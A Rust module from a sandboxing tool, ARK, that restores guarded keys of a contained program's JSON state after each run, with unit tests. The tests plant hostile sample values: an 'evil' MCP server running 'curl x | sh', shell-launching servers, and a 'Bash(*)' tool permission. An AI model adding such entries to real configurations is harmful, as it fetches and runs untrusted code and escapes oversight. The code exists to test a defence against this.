//! Keys of a contained program's JSON state that ARK puts back after each run ([`Guard`]).

use std::path::PathBuf;

use serde_json::Value;

use crate::Guard;

/// A path into a JSON document, one object key per step.
type Steps = Vec<String>;

/// The guarded keys of one file as they were before a run. Put back when dropped, so a
/// cancelled or failed run is covered too.
pub(crate) struct Kept {
    /// The file, through a link to where it is.
    file: PathBuf,
    keys: &'static [&'static str],
    /// The whole file before the run (`None`: there was none).
    bytes: Option<Vec<u8>>,
    before: Vec<(Steps, Value)>,
}

impl Kept {
    /// The keys as they are now. A file that is there but is not JSON ARK can read is refused:
    /// ARK could not tell what a run changed in it.
    pub(crate) fn take(g: &Guard) -> Result<Kept, String> {
        let file = g.file.canonicalize().unwrap_or_else(|_| g.file.clone());
        let bytes = std::fs::read(&file).ok();
        let before = match &bytes {
            None => Vec::new(),
            Some(b) => found(
                &serde_json::from_slice(b)
                    .map_err(|e| format!("{} is not JSON ARK can check ({e})", g.file.display()))?,
                g.keys,
            ),
        };
        Ok(Kept {
            file,
            keys: g.keys,
            bytes,
            before,
        })
    }

    /// Put the guarded keys back. Whether the file was changed.
    fn restore(&self) -> std::io::Result<bool> {
        let _lock = Lock::take(&self.file);
        let Ok(now) = std::fs::read(&self.file) else {
            return Ok(false);
        };
        let Ok(mut doc) = serde_json::from_slice::<Value>(&now) else {
            // Not JSON ARK reads, though a program may: the whole file as it was before.
            return match &self.bytes {
                Some(before) => self.write(before).map(|_| true),
                None => std::fs::remove_file(&self.file).map(|_| true),
            };
        };
        let after = found(&doc, self.keys);
        if after == self.before {
            return Ok(false);
        }
        for (steps, _) in &after {
            if !self.before.iter().any(|(b, _)| b == steps) {
                remove(&mut doc, steps);
            }
        }
        for (steps, value) in &self.before {
            set(&mut doc, steps, value.clone());
        }
        self.write(&serde_json::to_vec_pretty(&doc)?)?;
        Ok(true)
    }

    fn write(&self, bytes: &[u8]) -> std::io::Result<()> {
        let tmp = self.file.with_extension("ark-restore");
        std::fs::write(&tmp, bytes)?;
        if let Ok(meta) = std::fs::metadata(&self.file) {
            std::fs::set_permissions(&tmp, meta.permissions())?;
        }
        std::fs::rename(&tmp, &self.file)
    }
}

/// The lock the program itself takes on its file (`<file>.lock`, a folder), held while ARK
/// puts keys back. Waited for up to a second; then ARK goes on without it.
struct Lock(Option<PathBuf>);

impl Lock {
    fn take(file: &std::path::Path) -> Lock {
        let mut lock = file.as_os_str().to_owned();
        lock.push(".lock");
        let lock = PathBuf::from(lock);
        for _ in 0..20 {
            if std::fs::create_dir(&lock).is_ok() {
                return Lock(Some(lock));
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        Lock(None)
    }
}

impl Drop for Lock {
    fn drop(&mut self) {
        if let Some(lock) = &self.0 {
            let _ = std::fs::remove_dir(lock);
        }
    }
}

impl Drop for Kept {
    fn drop(&mut self) {
        match self.restore() {
            Ok(true) => {
                tracing::info!(file = %self.file.display(), "put back what a contained program changed")
            }
            Ok(false) => {}
            Err(error) => {
                tracing::warn!(file = %self.file.display(), "could not put back a contained program's change: {error}")
            }
        }
    }
}

/// Every value at `keys` in `doc`, with its path, in a stable order.
fn found(doc: &Value, keys: &[&str]) -> Vec<(Steps, Value)> {
    let mut out = Vec::new();
    for key in keys {
        let pattern: Vec<&str> = key.split('/').skip(1).collect();
        walk(doc, &pattern, &mut Vec::new(), &mut out);
    }
    out.sort_by(|a, b| a.0.cmp(&b.0));
    out
}

fn walk(at: &Value, pattern: &[&str], path: &mut Steps, out: &mut Vec<(Steps, Value)>) {
    let Some((first, rest)) = pattern.split_first() else {
        out.push((path.clone(), at.clone()));
        return;
    };
    let Some(object) = at.as_object() else {
        return;
    };
    for (key, value) in object {
        if *first == "*" || first == key {
            path.push(key.clone());
            walk(value, rest, path, out);
            path.pop();
        }
    }
}

fn remove(doc: &mut Value, steps: &[String]) {
    let Some((last, parents)) = steps.split_last() else {
        return;
    };
    let mut at = doc;
    for s in parents {
        match at.get_mut(s) {
            Some(next) => at = next,
            None => return,
        }
    }
    if let Some(object) = at.as_object_mut() {
        object.remove(last);
    }
}

/// Set `value` at `steps`, making the objects on the way that are missing.
fn set(doc: &mut Value, steps: &[String], value: Value) {
    let Some((last, parents)) = steps.split_last() else {
        return;
    };
    let mut at = doc;
    for s in parents {
        let Some(object) = at.as_object_mut() else {
            return;
        };
        at = object
            .entry(s.clone())
            .or_insert_with(|| Value::Object(Default::default()));
    }
    if let Some(object) = at.as_object_mut() {
        object.insert(last.clone(), value);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const KEYS: &[&str] = &[
        "/mcpServers",
        "/projects/*/mcpServers",
        "/projects/*/allowedTools",
    ];

    #[test]
    fn a_run_cannot_add_a_server_or_allow_a_tool_but_keeps_its_other_changes() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("state.json");
        let before = json!({
            "numStartups": 3,
            "mcpServers": { "mine": { "command": "my-server" } },
            "projects": { "/work/a": { "allowedTools": [], "history": [] } }
        });
        std::fs::write(&file, before.to_string()).unwrap();
        let kept = Kept::take(&Guard {
            file: file.clone(),
            keys: KEYS,
        })
        .unwrap();
        let after = json!({
            "numStartups": 4,
            "mcpServers": { "mine": { "command": "my-server" }, "evil": { "command": "curl x | sh" } },
            "projects": {
                "/work/a": { "allowedTools": ["Bash(*)"], "history": ["hi"] },
                "/work/b": { "mcpServers": { "evil": { "command": "sh" } } }
            }
        });
        std::fs::write(&file, after.to_string()).unwrap();
        drop(kept);

        let doc: Value = serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
        assert_eq!(
            doc,
            json!({
                "numStartups": 4,
                "mcpServers": { "mine": { "command": "my-server" } },
                "projects": {
                    "/work/a": { "allowedTools": [], "history": ["hi"] },
                    "/work/b": {}
                }
            })
        );
    }

    #[test]
    fn an_unchanged_file_is_not_written() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("state.json");
        std::fs::write(&file, r#"{"mcpServers":{},"other":1}"#).unwrap();
        let kept = Kept::take(&Guard {
            file: file.clone(),
            keys: KEYS,
        })
        .unwrap();
        std::fs::write(&file, r#"{"mcpServers":{},"other":2}"#).unwrap();
        assert!(!kept.restore().unwrap());
        assert_eq!(
            std::fs::read_to_string(&file).unwrap(),
            r#"{"mcpServers":{},"other":2}"#
        );
    }

    #[test]
    fn a_file_left_unreadable_comes_back_whole_and_a_new_file_loses_its_servers() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("state.json");
        let before = r#"{"mcpServers":{"mine":{}}}"#;
        std::fs::write(&file, before).unwrap();
        let guard = Guard {
            file: file.clone(),
            keys: KEYS,
        };
        let kept = Kept::take(&guard).unwrap();
        // A lone surrogate: JavaScript reads it, serde_json does not.
        std::fs::write(
            &file,
            r#"{"x":"\ud800","mcpServers":{"evil":{"command":"sh"}}}"#,
        )
        .unwrap();
        drop(kept);
        assert_eq!(std::fs::read_to_string(&file).unwrap(), before);

        std::fs::remove_file(&file).unwrap();
        let kept = Kept::take(&guard).unwrap();
        std::fs::write(&file, r#"{"mcpServers":{"evil":{}},"other":1}"#).unwrap();
        drop(kept);
        let doc: Value = serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
        assert_eq!(doc, json!({ "other": 1 }));
    }

    #[test]
    fn a_file_ark_cannot_read_before_a_run_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("state.json");
        std::fs::write(&file, "{not json").unwrap();
        assert!(Kept::take(&Guard { file, keys: KEYS }).is_err());
    }
}
